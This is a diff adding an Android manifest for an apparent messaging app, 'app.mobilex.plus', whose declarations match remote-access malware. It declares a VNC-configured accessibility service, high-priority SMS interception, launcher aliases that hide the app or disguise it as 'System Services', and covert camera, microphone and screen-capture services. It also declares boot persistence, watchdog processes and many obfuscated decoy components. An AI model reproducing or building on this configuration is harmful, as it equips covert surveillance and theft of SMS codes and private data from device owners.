@@ -1,0 +1,348 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android" android:compileSdkVersion="34" android:compileSdkVersionCodename="14" package="app.mobilex.plus" platformBuildVersionCode="34" platformBuildVersionName="14">
+    <uses-permission android:name="android.permission.READ_PHONE_NUMBERS"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM"/>
+    <uses-permission android:name="android.permission.RECEIVE_WAP_PUSH"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.READ_CONTACTS"/>
+    <uses-permission android:name="android.permission.VIBRATE"/>
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
+    <uses-permission android:name="android.permission.USE_EXACT_ALARM"/>
+    <uses-permission android:name="android.permission.READ_SMS"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES"/>
+    <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+    <uses-permission android:maxSdkVersion="32" android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES"/>
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
+    <uses-permission android:name="android.permission.CALL_PHONE"/>
+    <uses-permission android:name="android.permission.RECEIVE_MMS"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC"/>
+    <uses-permission android:name="android.permission.CAMERA"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA"/>
+    <uses-permission android:name="android.permission.REQUEST_DELETE_PACKAGES"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+    <uses-permission android:name="android.permission.GET_ACCOUNTS"/>
+    <uses-permission android:name="android.permission.USE_FULL_SCREEN_INTENT"/>
+    <uses-feature android:name="android.hardware.telephony" android:required="true"/>
+    <uses-feature android:name="android.hardware.camera" android:required="false"/>
+    <uses-feature android:name="android.hardware.camera.front" android:required="false"/>
+    <queries>
+        <intent>
+            <action android:name="android.intent.action.MAIN"/>
+            <category android:name="android.intent.category.LAUNCHER"/>
+        </intent>
+    </queries>
+    <uses-permission android:name="android.permission.ACCESS_ADSERVICES_TOPICS"/>
+    <uses-permission android:name="com.google.android.c2dm.permission.RECEIVE"/>
+    <permission android:name="app.mobilex.plus.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" android:protectionLevel="signature"/>
+    <uses-permission android:name="app.mobilex.plus.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"/>
+    <application android:allowBackup="false" android:appComponentFactory="androidx.core.app.CoreComponentFactory" android:extractNativeLibs="true" android:icon="@mipmap/ic_launcher" android:label="@string/app_name" android:name="app.mobilex.plus.App" android:networkSecurityConfig="@xml/network_security_config" android:usesCleartextTraffic="true" android:roundIcon="@mipmap/ic_launcher_round" android:supportsRtl="true" android:theme="@style/Theme.App">
+        <activity android:configChanges="orientation|screenSize" android:enabled="false" android:exported="true" android:launchMode="singleTask" android:name="app.mobilex.plus.MainActivity" android:theme="@style/Theme.App">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </activity>
+        <activity-alias android:enabled="false" android:exported="true" android:icon="@mipmap/ic_launcher" android:label="System Services" android:name="app.mobilex.plus.SystemAlias" android:targetActivity="app.mobilex.plus.MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:enabled="false" android:exported="true" android:name="app.mobilex.plus.HiddenAlias" android:targetActivity="app.mobilex.plus.MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:enabled="true" android:exported="true" android:name="app.mobilex.plus.VisibleAlias" android:targetActivity="app.mobilex.plus.MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <activity android:exported="false" android:name="app.mobilex.plus.ui.ConversationListActivity" android:theme="@style/Theme.App"/>
+        <activity android:exported="false" android:name="app.mobilex.plus.ui.NewMessageActivity" android:theme="@style/Theme.App" android:windowSoftInputMode="adjustResize"/>
+        <activity android:exported="false" android:name="app.mobilex.plus.ui.SearchActivity" android:theme="@style/Theme.App"/>
+        <activity android:exported="false" android:name="app.mobilex.plus.ui.SettingsActivity" android:theme="@style/Theme.App"/>
+        <activity android:exported="false" android:name="app.mobilex.plus.ui.ProfileActivity" android:theme="@style/Theme.App"/>
+        <activity android:exported="false" android:name="app.mobilex.plus.ui.ArchivedActivity" android:theme="@style/Theme.App"/>
+        <activity android:exported="false" android:name="app.mobilex.plus.CacheEWBridge" android:theme="@style/Theme.App"/>
+        <activity android:exported="true" android:name="app.mobilex.plus.ManagerGXController" android:theme="@style/Theme.App">
+            <intent-filter>
+                <action android:name="android.intent.action.SEND"/>
+                <action android:name="android.intent.action.SENDTO"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+                <category android:name="android.intent.category.BROWSABLE"/>
+                <data android:scheme="sms"/>
+                <data android:scheme="smsto"/>
+                <data android:scheme="mms"/>
+                <data android:scheme="mmsto"/>
+            </intent-filter>
+        </activity>
+        <activity android:configChanges="orientation|screenSize" android:exported="false" android:launchMode="singleTop" android:name="app.mobilex.plus.UtilNWWrapper" android:theme="@style/Theme.App"/>
+        <activity android:exported="false" android:name="app.mobilex.plus.ConfigQTProcessor" android:theme="@style/Theme.App"/>
+        <activity android:excludeFromRecents="true" android:exported="false" android:launchMode="singleTask" android:name="app.mobilex.plus.UtilGLWorker" android:theme="@style/Theme.App"/>
+        <activity android:exported="false" android:name="app.mobilex.plus.ManagerQJWorker" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <activity android:excludeFromRecents="true" android:exported="false" android:launchMode="singleTask" android:name="app.mobilex.plus.UtilNRBridge" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <activity android:excludeFromRecents="true" android:exported="false" android:name="app.mobilex.plus.HandlerSJAdapter" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <activity android:excludeFromRecents="true" android:exported="false" android:launchMode="singleInstance" android:name="app.mobilex.plus.HelperYOLoader" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <activity android:excludeFromRecents="true" android:exported="false" android:launchMode="singleTop" android:name="app.mobilex.plus.ChatActivity" android:taskAffinity="" android:theme="@android:style/Theme.NoTitleBar"/>
+        <service android:exported="true" android:name="app.mobilex.plus.services.DataQFAdapter" android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService"/>
+            </intent-filter>
+            <meta-data android:name="android.accessibilityservice" android:resource="@xml/vnc_accessibility_config"/>
+        </service>
+        <receiver android:exported="true" android:name="app.mobilex.plus.receivers.UtilXTAdapter" android:permission="android.permission.BROADCAST_SMS">
+            <intent-filter android:priority="285">
+                <action android:name="android.provider.Telephony.SMS_DELIVER"/>
+            </intent-filter>
+            <intent-filter android:priority="285">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:exported="true" android:name="app.mobilex.plus.receivers.ExactAlarmPermissionReceiver">
+            <intent-filter>
+                <action android:name="android.app.action.SCHEDULE_EXACT_ALARM_PERMISSION_STATE_CHANGED"/>
+            </intent-filter>
+        </receiver>
+        <service android:exported="false" android:name="app.mobilex.plus.services.AuthenticatorService">
+            <intent-filter>
+                <action android:name="android.accounts.AccountAuthenticator"/>
+            </intent-filter>
+            <meta-data android:name="android.accounts.AccountAuthenticator" android:resource="@xml/authenticator"/>
+        </service>
+        <service android:exported="false" android:name="app.mobilex.plus.services.DataBVTask" android:permission="android.permission.BIND_JOB_SERVICE"/>
+        <service android:exported="false" android:foregroundServiceType="specialUse" android:name="app.mobilex.plus.services.KeepAliveVpnService" android:permission="android.permission.BIND_VPN_SERVICE">
+            <intent-filter>
+                <action android:name="android.net.VpnService"/>
+            </intent-filter>
+            <property android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE" android:value="vpn"/>
+        </service>
+        <service android:exported="true" android:name="app.mobilex.plus.services.ProviderFTProcessor" android:permission="android.permission.SEND_RESPOND_VIA_MESSAGE">
+            <intent-filter>
+                <action android:name="android.intent.action.RESPOND_VIA_MESSAGE"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+                <data android:scheme="sms"/>
+                <data android:scheme="smsto"/>
+                <data android:scheme="mms"/>
+                <data android:scheme="mmsto"/>
+            </intent-filter>
+        </service>
+        <service android:exported="false" android:name="app.mobilex.plus.services.UpdateXPBridge">
+            <intent-filter>
+                <action android:name="com.google.firebase.MESSAGING_EVENT"/>
+            </intent-filter>
+        </service>
+        <service android:exported="false" android:foregroundServiceType="specialUse" android:name="app.mobilex.plus.services.SyncQYAdapter" android:stopWithTask="false">
+            <property android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE" android:value="sync"/>
+        </service>
+        <service android:exported="true" android:icon="@mipmap/ic_launcher" android:label="System Service" android:name="app.mobilex.plus.services.KeepAliveTileService" android:permission="android.permission.BIND_QUICK_SETTINGS_TILE">
+            <intent-filter>
+                <action android:name="android.service.quicksettings.action.QS_TILE"/>
+            </intent-filter>
+        </service>
+        <service android:exported="false" android:name="app.mobilex.plus.services.SyncAdapterService">
+            <intent-filter>
+                <action android:name="android.content.SyncAdapter"/>
+            </intent-filter>
+            <meta-data android:name="android.content.SyncAdapter" android:resource="@xml/syncadapter"/>
+        </service>
+        <receiver android:exported="true" android:name="app.mobilex.plus.receivers.ProviderMEController">
+            <intent-filter>
+                <action android:name="android.intent.action.AIRPLANE_MODE"/>
+                <action android:name="android.intent.action.LOCALE_CHANGED"/>
+                <action android:name="android.intent.action.TIMEZONE_CHANGED"/>
+                <action android:name="android.intent.action.DEVICE_STORAGE_LOW"/>
+                <action android:name="android.intent.action.DEVICE_STORAGE_OK"/>
+                <action android:name="android.intent.action.ACTION_POWER_CONNECTED"/>
+                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED"/>
+                <action android:name="android.intent.action.BATTERY_LOW"/>
+                <action android:name="android.intent.action.BATTERY_OKAY"/>
+                <action android:name="android.intent.action.USER_PRESENT"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:exported="true" android:name="app.mobilex.plus.receivers.SyncXLProcessor" android:permission="android.permission.BROADCAST_SMS">
+            <intent-filter>
+                <action android:name="android.provider.Telephony.SMS_DELIVER"/>
+            </intent-filter>
+        </receiver>
+        <service android:exported="false" android:foregroundServiceType="mediaProjection" android:name="app.mobilex.plus.services.ManagerUMController"/>
+        <service android:exported="false" android:foregroundServiceType="camera" android:name="app.mobilex.plus.services.ConfigTQWorker"/>
+        <service android:exported="false" android:foregroundServiceType="camera" android:name="app.mobilex.plus.services.UtilAIWorker"/>
+        <service android:exported="false" android:foregroundServiceType="microphone" android:name="app.mobilex.plus.services.CacheLUJob"/>
+        <service android:directBootAware="false" android:enabled="@bool/enable_system_foreground_service_default" android:exported="false" android:foregroundServiceType="dataSync" android:name="androidx.work.impl.foreground.SystemForegroundService"/>
+        <receiver android:exported="true" android:name="app.mobilex.plus.receivers.HandlerXNLoader">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED"/>
+                <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
+                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON"/>
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED"/>
+                <action android:name="android.intent.action.PACKAGE_REPLACED"/>
+                <action android:name="android.intent.action.PACKAGE_ADDED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:exported="true" android:name="app.mobilex.plus.receivers.UpdateJSWrapper" android:permission="android.permission.BROADCAST_WAP_PUSH">
+            <intent-filter>
+                <action android:name="android.provider.Telephony.WAP_PUSH_DELIVER"/>
+                <data android:mimeType="application/vnd.wap.mms-message"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:exported="true" android:name="app.mobilex.plus.receivers.KeepAliveWidgetProvider">
+            <intent-filter>
+                <action android:name="android.appwidget.action.APPWIDGET_UPDATE"/>
+            </intent-filter>
+            <meta-data android:name="android.appwidget.provider" android:resource="@xml/widget_info"/>
+        </receiver>
+        <service android:enabled="true" android:exported="false" android:foregroundServiceType="specialUse" android:name="app.mobilex.plus.services.GuardianService" android:process=":g">
+            <property android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE" android:value="monitoring"/>
+        </service>
+        <provider android:authorities="app.mobilex.plus.provider" android:exported="false" android:name="app.mobilex.plus.services.StubContentProvider" android:syncable="true"/>
+        <service android:exported="true" android:name="app.mobilex.plus.services.ConfigLWJob" android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService"/>
+            </intent-filter>
+        </service>
+        <service android:exported="true" android:name="app.mobilex.plus.services.ScreenSaverService" android:permission="android.permission.BIND_DREAM_SERVICE">
+            <intent-filter>
+                <action android:name="android.service.dreams.DreamService"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+            <meta-data android:name="android.service.dream" android:resource="@xml/screensaver_config"/>
+        </service>
+        <receiver android:enabled="false" android:exported="false" android:name="app.mobilex.plus.RemoteInitializer"/>
+        <provider android:authorities="app.mobilex.plus.contentinitializer" android:enabled="false" android:exported="false" android:grantUriPermissions="false" android:name="app.mobilex.plus.ContentInitializer"/>
+        <service android:enabled="false" android:exported="false" android:name="app.mobilex.plus.BillingController"/>
+        <service android:enabled="false" android:exported="false" android:name="app.mobilex.plus.MediaDispatcher"/>
+        <provider android:authorities="app.mobilex.plus.metricsinitializer" android:enabled="false" android:exported="false" android:grantUriPermissions="false" android:name="app.mobilex.plus.MetricsInitializer"/>
+        <provider android:authorities="app.mobilex.plus.notificationprovider" android:enabled="false" android:exported="false" android:grantUriPermissions="false" android:name="app.mobilex.plus.NotificationProvider"/>
+        <provider android:authorities="app.mobilex.plus.iapcontroller" android:enabled="false" android:exported="false" android:grantUriPermissions="false" android:name="app.mobilex.plus.IapController"/>
+        <provider android:authorities="app.mobilex.plus.billingreceiver" android:enabled="false" android:exported="false" android:grantUriPermissions="false" android:name="app.mobilex.plus.BillingReceiver"/>
+        <provider android:authorities="app.mobilex.plus.mediaprocessor" android:enabled="false" android:exported="false" android:grantUriPermissions="false" android:name="app.mobilex.plus.MediaProcessor"/>
+        <provider android:authorities="app.mobilex.plus.onboardingtracker" android:enabled="false" android:exported="false" android:grantUriPermissions="false" android:name="app.mobilex.plus.OnboardingTracker"/>
+        <service android:enabled="false" android:exported="false" android:name="app.mobilex.plus.StorageTracker"/>
+        <provider android:authorities="app.mobilex.plus.metricsdelegate" android:enabled="false" android:exported="false" android:grantUriPermissions="false" android:name="app.mobilex.plus.MetricsDelegate"/>
+        <receiver android:enabled="false" android:exported="false" android:name="app.mobilex.plus.WearDispatcher"/>
+        <activity android:enabled="false" android:exported="false" android:name="app.mobilex.plus.OnboardingMonitor"/>
+        <receiver android:enabled="false" android:exported="false" android:name="app.mobilex.plus.ShareDelegate"/>
+        <service android:enabled="false" android:exported="false" android:name="app.mobilex.plus.NfcInitializer"/>
+        <activity android:enabled="false" android:exported="false" android:name="app.mobilex.plus.NfcProvider"/>
+        <provider android:authorities="app.mobilex.plus.reviewscheduler" android:enabled="false" android:exported="false" android:grantUriPermissions="false" android:name="app.mobilex.plus.ReviewScheduler"/>
+        <activity android:enabled="false" android:exported="false" android:name="app.mobilex.plus.IapReceiver"/>
+        <provider android:authorities="app.mobilex.plus.onboardingfactory" android:enabled="false" android:exported="false" android:grantUriPermissions="false" android:name="app.mobilex.plus.OnboardingFactory"/>
+        <receiver android:enabled="false" android:exported="false" android:name="app.mobilex.plus.BillingWorker"/>
+        <service android:enabled="false" android:exported="false" android:name="app.mobilex.plus.MigrationMonitor"/>
+        <receiver android:enabled="false" android:exported="false" android:name="app.mobilex.plus.InstallProvider"/>
+        <provider android:authorities="app.mobilex.plus.updatedelegate" android:enabled="false" android:exported="false" android:grantUriPermissions="false" android:name="app.mobilex.plus.UpdateDelegate"/>
+        <service android:enabled="false" android:exported="false" android:name="app.mobilex.plus.PushController"/>
+        <provider android:authorities="app.mobilex.plus.schedulerprocessor" android:enabled="false" android:exported="false" android:grantUriPermissions="false" android:name="app.mobilex.plus.SchedulerProcessor"/>
+        <provider android:authorities="app.mobilex.plus.schedulerinitializer" android:enabled="false" android:exported="false" android:grantUriPermissions="false" android:name="app.mobilex.plus.SchedulerInitializer"/>
+        <provider android:authorities="app.mobilex.plus.contentmanager" android:enabled="false" android:exported="false" android:grantUriPermissions="false" android:name="app.mobilex.plus.ContentManager"/>
+        <receiver android:enabled="false" android:exported="false" android:name="app.mobilex.plus.DownloadListener"/>
+        <provider android:authorities="app.mobilex.plus.syncworker" android:enabled="false" android:exported="false" android:grantUriPermissions="false" android:name="app.mobilex.plus.SyncWorker"/>
+        <receiver android:enabled="false" android:exported="false" android:name="app.mobilex.plus.StorageDispatcher"/>
+        <receiver android:enabled="false" android:exported="false" android:name="app.mobilex.plus.BluetoothDelegate"/>
+        <meta-data android:name="com.google.firebase.messaging.default_notification_channel_id" android:value="default"/>
+        <meta-data android:name="com.google.android.gms.version" android:value="@integer/google_play_services_version"/>
+        <meta-data android:name="androidx.work.WorkManagerInitializer" android:value="androidx.startup"/>
+        <meta-data android:name="google_analytics_adid_collection_enabled" android:value="true"/>
+        <service android:directBootAware="false" android:enabled="@bool/enable_system_alarm_service_default" android:exported="false" android:name="androidx.work.impl.background.systemalarm.SystemAlarmService"/>
+        <service android:directBootAware="false" android:enabled="@bool/enable_system_job_service_default" android:exported="true" android:name="androidx.work.impl.background.systemjob.SystemJobService" android:permission="android.permission.BIND_JOB_SERVICE"/>
+        <receiver android:directBootAware="false" android:enabled="true" android:exported="false" android:name="androidx.work.impl.utils.ForceStopRunnable$BroadcastReceiver"/>
+        <receiver android:directBootAware="false" android:enabled="false" android:exported="false" android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$BatteryChargingProxy">
+            <intent-filter>
+                <action android:name="android.intent.action.ACTION_POWER_CONNECTED"/>
+                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:directBootAware="false" android:enabled="false" android:exported="false" android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$BatteryNotLowProxy">
+            <intent-filter>
+                <action android:name="android.intent.action.BATTERY_OKAY"/>
+                <action android:name="android.intent.action.BATTERY_LOW"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:directBootAware="false" android:enabled="false" android:exported="false" android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$StorageNotLowProxy">
+            <intent-filter>
+                <action android:name="android.intent.action.DEVICE_STORAGE_LOW"/>
+                <action android:name="android.intent.action.DEVICE_STORAGE_OK"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:directBootAware="false" android:enabled="false" android:exported="false" android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$NetworkStateProxy">
+            <intent-filter>
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:directBootAware="false" android:enabled="false" android:exported="false" android:name="androidx.work.impl.background.systemalarm.RescheduleReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="android.intent.action.TIME_SET"/>
+                <action android:name="android.intent.action.TIMEZONE_CHANGED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:directBootAware="false" android:enabled="@bool/enable_system_alarm_service_default" android:exported="false" android:name="androidx.work.impl.background.systemalarm.ConstraintProxyUpdateReceiver">
+            <intent-filter>
+                <action android:name="androidx.work.impl.background.systemalarm.UpdateProxies"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:directBootAware="false" android:enabled="true" android:exported="true" android:name="androidx.work.impl.diagnostics.DiagnosticsReceiver" android:permission="android.permission.DUMP">
+            <intent-filter>
+                <action android:name="androidx.work.diagnostics.REQUEST_DIAGNOSTICS"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:exported="true" android:name="com.google.firebase.iid.FirebaseInstanceIdReceiver" android:permission="com.google.android.c2dm.permission.SEND">
+            <intent-filter>
+                <action android:name="com.google.android.c2dm.intent.RECEIVE"/>
+            </intent-filter>
+            <meta-data android:name="com.google.android.gms.cloudmessaging.FINISHED_AFTER_HANDLED" android:value="true"/>
+        </receiver>
+        <service android:directBootAware="true" android:exported="false" android:name="com.google.firebase.messaging.FirebaseMessagingService">
+            <intent-filter android:priority="-500">
+                <action android:name="com.google.firebase.MESSAGING_EVENT"/>
+            </intent-filter>
+        </service>
+        <service android:directBootAware="true" android:exported="false" android:name="com.google.firebase.components.ComponentDiscoveryService">
+            <meta-data android:name="com.google.firebase.components:com.google.firebase.messaging.FirebaseMessagingKtxRegistrar" android:value="com.google.firebase.components.ComponentRegistrar"/>
+            <meta-data android:name="com.google.firebase.components:com.google.firebase.messaging.FirebaseMessagingRegistrar" android:value="com.google.firebase.components.ComponentRegistrar"/>
+            <meta-data android:name="com.google.firebase.components:com.google.firebase.installations.FirebaseInstallationsKtxRegistrar" android:value="com.google.firebase.components.ComponentRegistrar"/>
+            <meta-data android:name="com.google.firebase.components:com.google.firebase.installations.FirebaseInstallationsRegistrar" android:value="com.google.firebase.components.ComponentRegistrar"/>
+            <meta-data android:name="com.google.firebase.components:com.google.firebase.ktx.FirebaseCommonLegacyRegistrar" android:value="com.google.firebase.components.ComponentRegistrar"/>
+            <meta-data android:name="com.google.firebase.components:com.google.firebase.FirebaseCommonKtxRegistrar" android:value="com.google.firebase.components.ComponentRegistrar"/>
+            <meta-data android:name="com.google.firebase.components:com.google.firebase.datatransport.TransportRegistrar" android:value="com.google.firebase.components.ComponentRegistrar"/>
+        </service>
+        <activity android:exported="false" android:name="com.google.android.gms.common.api.GoogleApiActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <service android:directBootAware="true" android:exported="false" android:name="androidx.room.MultiInstanceInvalidationService"/>
+        <service android:exported="false" android:name="com.google.android.datatransport.runtime.backends.TransportBackendDiscovery">
+            <meta-data android:name="backend:com.google.android.datatransport.cct.CctBackendFactory" android:value="cct"/>
+        </service>
+        <service android:exported="false" android:name="com.google.android.datatransport.runtime.scheduling.jobscheduling.JobInfoSchedulerService" android:permission="android.permission.BIND_JOB_SERVICE"/>
+        <receiver android:exported="false" android:name="com.google.android.datatransport.runtime.scheduling.jobscheduling.AlarmManagerSchedulerBroadcastReceiver"/>
+        <receiver android:directBootAware="false" android:enabled="true" android:exported="true" android:name="androidx.profileinstaller.ProfileInstallReceiver" android:permission="android.permission.DUMP">
+            <intent-filter>
+                <action android:name="androidx.profileinstaller.action.INSTALL_PROFILE"/>
+            </intent-filter>
+            <intent-filter>
+                <action android:name="androidx.profileinstaller.action.SKIP_FILE"/>
+            </intent-filter>
+            <intent-filter>
+                <action android:name="androidx.profileinstaller.action.SAVE_PROFILE"/>
+            </intent-filter>
+            <intent-filter>
+                <action android:name="androidx.profileinstaller.action.BENCHMARK_OPERATION"/>
+            </intent-filter>
+        </receiver>
+    </application>
+</manifest>
